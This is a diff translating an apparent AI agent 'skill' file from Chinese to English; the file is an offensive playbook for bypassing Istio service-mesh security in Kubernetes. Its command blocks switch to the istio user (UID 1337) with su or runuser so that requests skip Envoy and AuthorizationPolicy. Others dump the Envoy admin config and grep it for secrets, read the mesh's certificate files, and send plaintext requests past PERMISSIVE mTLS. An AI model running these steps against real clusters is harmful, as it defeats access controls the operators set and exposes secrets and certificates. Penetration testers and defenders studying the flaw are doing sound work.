@@ -1,48 +1,50 @@
 ---
 name: k8s-istio-bypass
-description: "Istio Service Mesh 安全策略绕过。当目标 K8s 集群使用 Istio、请求被 AuthorizationPolicy 拒绝（403 RBAC denied）、或发现 Envoy sidecar 时使用。核心手法：UID 1337 绕过 Envoy。任何在 K8s 中遇到 Istio 策略阻拦、Service Mesh 限制、或 Envoy 相关安全控制的场景都应使用此技能"
+description: "Istio Service Mesh security policy bypass. Use when the target K8s cluster runs Istio, requests are denied by AuthorizationPolicy (403 RBAC denied), or Envoy sidecars are present. Core technique: UID 1337 Envoy bypass. Use this skill whenever Istio policy enforcement, service mesh restrictions, or Envoy-related security controls are encountered in K8s"
+zh-signals: "绕过 Istio 服务网格安全策略，核心手法为利用 UID 1337 绕过 Envoy 流量拦截。信号:Istio,K8s,Envoy,UID 1337,策略绕过"
+when-to-use: "Use when a Kubernetes cluster uses Istio, requests are denied by AuthorizationPolicy (403 RBAC denied), or Envoy sidecars are present and you need to bypass mesh policy enforcement."
 metadata:
-  tags: "k8s,kubernetes,istio,envoy,service-mesh,authorizationpolicy,bypass,策略绕过,服务网格"
+  tags: "k8s,kubernetes,istio,envoy,service-mesh,authorizationpolicy,bypass,policy-bypass,service-mesh"
   category: "cloud"
 ---
 
-# Istio Service Mesh 安全策略绕过
+# Istio Service Mesh Security Policy Bypass
 
-Istio 通过 Envoy sidecar 实现流量管理和安全策略。但 Istio 的架构中有一个根本性的设计缺陷可以被利用：Envoy 以 UID 1337 运行，而 iptables 规则会排除 UID 1337 的流量以避免死循环——这意味着以该 UID 身份发出的请求完全绕过 Envoy，所有 Istio 策略不再生效。
+Istio implements traffic management and security policy through the Envoy sidecar. But Istio's architecture has a fundamental design flaw that can be exploited: Envoy runs as UID 1337, and the iptables rules exclude traffic from UID 1337 to avoid a dead loop — meaning requests sent under that UID bypass Envoy entirely, and no Istio policy takes effect.
 
-## 核心手法: UID 1337 绕过
+## Core Technique: UID 1337 Bypass
 
-Istio 的 iptables 规则把 UID 1337 的出站流量排除在拦截范围之外（否则 Envoy 自身的出站流量也会被拦截形成死循环）。这个设计决定意味着：
+Istio's iptables rules exclude outbound traffic from UID 1337 from interception (otherwise Envoy's own outbound traffic would also be intercepted, forming a dead loop). This design decision means:
 
 ```
-正常流量:  Pod → iptables → Envoy (策略检查) → 目标
-UID 1337: Pod → iptables → (跳过 Envoy) → 直接到达目标
+Normal traffic:  Pod → iptables → Envoy (policy check) → target
+UID 1337: Pod → iptables → (skip Envoy) → reach the target directly
 ```
 
-### 利用步骤
+### Exploitation Steps
 
 ```bash
-# 1. 确认 istio 用户存在
+# 1. Confirm the istio user exists
 grep 1337 /etc/passwd
 # istio:x:1337:1337::/home/istio:/bin/sh
 
-# 2. 切换到 istio 用户
+# 2. Switch to the istio user
 su istio
-# 或
+# or
 su -s /bin/sh istio
 
-# 3. 以 istio 身份发起请求（绕过 AuthorizationPolicy）
+# 3. Send requests as the istio identity (bypasses AuthorizationPolicy)
 curl <target-service>.<namespace>.svc.cluster.local
 
-# 4. 如果 su 不可用，尝试 nsenter 或 runuser
+# 4. If su is unavailable, try nsenter or runuser
 runuser -u istio -- curl <target-service>
 ```
 
-> 参考: https://github.com/istio/istio/issues/4286
+> Reference: https://github.com/istio/istio/issues/4286
 
-### AuthorizationPolicy DENY 绕过示例
+### AuthorizationPolicy DENY Bypass Example
 
-当策略禁止特定 HTTP 方法时：
+When the policy blocks specific HTTP methods:
 ```yaml
 apiVersion: security.istio.io/v1beta1
 kind: AuthorizationPolicy
@@ -54,39 +56,39 @@ spec:
         methods: ["POST", "GET"]
 ```
 
-- ❌ 切换 HTTP Method (PATCH/PUT) — 通常返回 400
-- ✅ **以 UID 1337 发请求** — 完全绕过 Envoy，策略不生效
+- ❌ Switch the HTTP method (PATCH/PUT) — usually returns 400
+- ✅ **Send requests as UID 1337** — fully bypasses Envoy, the policy does not apply
 
 ---
 
-## 其他 Istio 利用手法
+## Other Istio Exploitation Techniques
 
-### Envoy 管理接口
+### Envoy Admin Interface
 
 ```bash
-# Envoy admin interface (默认 15000)
+# Envoy admin interface (default 15000)
 curl localhost:15000/
-curl localhost:15000/config_dump  # 完整配置（可能含 secret）
-curl localhost:15000/clusters     # 上游集群信息
-curl localhost:15000/listeners    # 监听器配置
-curl localhost:15000/stats        # 统计信息
+curl localhost:15000/config_dump  # full configuration (may contain secrets)
+curl localhost:15000/clusters     # upstream cluster information
+curl localhost:15000/listeners    # listener configuration
+curl localhost:15000/stats        # statistics
 
-# Pilot debug 接口 (默认 15014)
+# Pilot debug interface (default 15014)
 curl localhost:15014/debug/endpointz
 curl localhost:15014/debug/configz
 ```
 
-### mTLS 降级
+### mTLS Downgrade
 
 ```bash
-# 如果 PeerAuthentication 设为 PERMISSIVE（而非 STRICT）
-# 可以发送不带 mTLS 的明文请求
-curl http://<service>:<port>  # 明文 HTTP 可能被接受
+# If PeerAuthentication is set to PERMISSIVE (instead of STRICT)
+# you can send plaintext requests without mTLS
+curl http://<service>:<port>  # plaintext HTTP may be accepted
 ```
 
-### 利用 Sidecar 资源
+### Leveraging Sidecar Resources
 
-Envoy sidecar 可能缓存了 mTLS 证书和集群信息，配合 `Skill(skill="k8s-sidecar-attack")` 进一步利用。
+The Envoy sidecar may have cached mTLS certificates and cluster information — combine this with `Skill(skill="k8s-sidecar-attack")` for further exploitation.
 
 ```bash
 ls /etc/certs/ 2>/dev/null
@@ -96,33 +98,33 @@ cat /var/run/secrets/istio/root-cert.pem 2>/dev/null
 
 ---
 
-## 侦察流程
+## Reconnaissance Workflow
 
 ```bash
-# 1. 确认 Istio 存在
+# 1. Confirm Istio is present
 env | grep -i istio
 ls /var/run/secrets/istio/ 2>/dev/null
 curl -s localhost:15000/server_info 2>/dev/null | head -5
 
-# 2. 发现目标服务
+# 2. Discover target services
 k8spider scan -subnet <service-cidr>
 
-# 3. 直接访问（测试是否被 AuthorizationPolicy 阻止）
+# 3. Access directly (test whether an AuthorizationPolicy blocks you)
 curl -v <target-service>
-# 如果返回 403 RBAC access denied → 说明有 AuthorizationPolicy
+# If you get 403 RBAC access denied → an AuthorizationPolicy exists
 
-# 4. 尝试 UID 1337 绕过
+# 4. Try the UID 1337 bypass
 su istio -c "curl <target-service>"
 
-# 5. 检查 Envoy 管理接口
+# 5. Check the Envoy admin interface
 curl localhost:15000/config_dump | grep -i secret
 ```
 
 ---
 
-## 关键要点
+## Key Takeaways
 
-- **UID 1337 = Istio 的"上帝模式"** — 流量不经过 Envoy，不受任何 Istio 策略控制
-- Envoy admin 接口默认在 `localhost:15000`，可能泄露 secret 和集群拓扑
-- `PeerAuthentication: PERMISSIVE` 允许明文通信
-- Istio 的 `AuthorizationPolicy` 只在 Envoy 层生效，绕过 Envoy = 绕过所有策略
+- **UID 1337 = Istio's "god mode"** — traffic does not pass through Envoy and is not subject to any Istio policy
+- The Envoy admin interface listens on `localhost:15000` by default and may leak secrets and cluster topology
+- `PeerAuthentication: PERMISSIVE` allows plaintext communication
+- Istio's `AuthorizationPolicy` only takes effect at the Envoy layer — bypassing Envoy = bypassing every policy
